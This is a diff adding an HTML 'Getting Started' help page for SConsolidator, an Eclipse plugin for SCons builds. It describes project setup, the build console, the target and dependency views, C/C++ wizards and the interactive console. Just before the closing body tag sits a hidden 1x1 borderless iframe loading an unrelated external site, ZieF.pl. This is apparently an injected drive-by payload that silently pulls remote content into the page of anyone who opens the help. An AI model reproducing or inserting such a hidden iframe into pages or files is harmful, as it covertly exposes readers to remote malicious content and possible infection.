@@ -1,0 +1,96 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+	<link rel="stylesheet" type="text/css" href="../help.css">
+	<title>SConsolidator Getting Started</title>
+</head>
+<body>
+<h1>Getting Started</h1>
+<a name="gettingstarted"></a>
+<p>This guide gives you an overview of the various functionalities SConsolidator provides.
+We will show screenshots for the most important use cases and explain the screens
+shortly.</p>
+
+<h2>Add SCons support to an existing project</h2>
+<a name="addsconssupport"></a>
+<p>To add SCons support to an existing C/C++ project, just right click on the project(s) in the project explorer
+and choose one of the following two sub-menus of "SCons":
+<ul>
+<li>"Use self-provided SCons build" (aka <i>existing</i> mode) for projects where you provide the SCons build files</li>
+<li>"Use generated SCons build" (aka <i>managed</i> mode) for projects where SConsolidator should create and update the SCons build files</li>
+</ul>
+<p>Notice that you should only use <i>managed</i> for simple C/C++ projects. It can be considered as a good starting
+point if you are not yet familiar with SCons. As soon as your projects grow in size and complexity, you want to use
+your own provided SCons build files.
+</p>
+<p>For non-C/C++ projects, you only have one sub-menu named "Add SCons support".
+</p>
+
+<h2>Building projects with SCons</h2>
+<a name="buildproject"></a>
+<p>If you request a build, the output of a SCons build run is shown in a project specific console. 
+Compile errors are shown in red and hyperlinks are provided to directly jump to the location in the editor where the
+error was found by the compiler. Error markers are created for the compiler errors as
+we are used from Eclipse.</p>
+<img alt="Every SCons project has its associated build console." src="../images/buildconsole.png" />
+
+<h2>Target View</h2>
+<a name="targetview"></a>
+<p>SCons target view shows all the SCons projects in the current workspace and allows
+you to maintain the targets on a project level. To request a build for a specific target, you have to select it
+in the view and click the build button in the upper right corner. The same can be achieved for
+a build in the <a href="#interactiveconsole">interactive console</a>.</p>
+<img alt="SCons target view allows to conveniently build a target." src="../images/targetview.png" />
+<p>There is a dialog to create a new target for a SCons project. There you can define the
+name of the target and additional SCons options which will be used
+when SCons is invoked. Furthermore, you can also specify a target alias which is also shown
+in the target view.</p>
+<img alt="Dialog for creating a new target." src="../images/newtarget.png" />
+
+<h2>Dependency View</h2>
+<a name="dependencyview"></a>
+<p>The dependency view visualizes the dependencies of the selected target
+SCons has emitted. You can choose a target of a SCons project in the workspace
+with a click on the lookup symbol in the upper right corner. The dependencies are
+then shown in the graph area.</p>
+<img alt="Dependency visualization of a C++ project." src="../images/dependencyview.png" />
+
+<h2>C/C++ specific support</h2> 
+<a name="cppsupport"></a>
+
+<h3>Create new SCons based C/C++ Managed Project</h3>
+<a name="cppmanaged"></a>
+<p>To create a new SCons based project, you can use the "New Project" wizard of Eclipse
+and choose "C/C++ project". There you can see three new project types for SCons
+managed projects: executable, shared library and static library project.</p> 
+<img alt="Wizard to create a new SCons managed project (executable, shared or static library)."
+src="../images/newprojectdialog.png" />
+<p>SConsolidator also provides a facility to convert existing managed projects
+to SCons projects with a context menu on the project level ("SCons -&gt; Add SCons support")
+and with a wizard as shown in this figure.</p>
+<img alt="Dialog for converting existing managed build projects to SCons projects." src="../images/convertdialog.png" />
+
+<h3>Import of Existing SCons based C/C++ Project</h3>
+<a name="cppexisting"></a>
+<p>SConsolidator helps you to import existing SCons based C/C++ projects with a wizard. You can choose 
+the location where the code of the existing project is located. If the location contains 
+an Eclipse project, the name of the project
+is deduced and shown in the corresponding input field. In case you want to
+set further options for the initial SCons run, you have the possibility to put them in the field "SCons options". SConsolidator will then try to gather all include paths
+and macros of your project necessary for the CDT indexer to properly work and store them in the project settings.</p>
+<img alt="Wizard for importing existing SCons based projects." src="../images/importdialog.png" />
+
+<h2>Interactive Console</h2>
+<a name="interactiveconsole"></a>
+<p>To build single targets without the need to invoke full builds with every change, we
+provide an interactive console with SConsolidator where you have all the possibilities known from 
+SCons interactive mode. We allow building and cleaning of the
+corresponding target(s) for the source file currently loaded in the active editor and a
+redo of the last action as can be seen from the buttons. Of course,
+you can also type SCons commands in the interactive console directly.</p>
+<img alt="The interactive console for a SCons project provides all possibilities of SCons interactive mode like building of single targets." src="../images/interactiveconsole.png" />
+
+<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
